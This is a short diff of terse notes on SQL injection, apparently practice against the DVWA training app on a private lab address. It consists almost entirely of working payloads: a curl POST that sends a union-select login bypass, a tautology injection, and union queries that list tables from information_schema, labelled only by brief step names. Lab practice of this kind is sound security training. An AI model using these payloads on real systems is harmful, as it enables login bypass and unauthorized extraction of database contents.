@@ -1,4 +1,4 @@
-
+curl -v -XPOST --data "username=' union select 1--&password=123" http://192.168.110.103/login
  union select null,table_name from information_schema.tables where table_cschema = 'noswap' 
 	%' or '0'='0
 find all true records
@@ -18,7 +18,7 @@ ______________-
 find db name
  dvwa
 
-________
+ ________
 display all tables in database schema
 %' and 1=0 union select null, table_name from information_schema.tables#
 
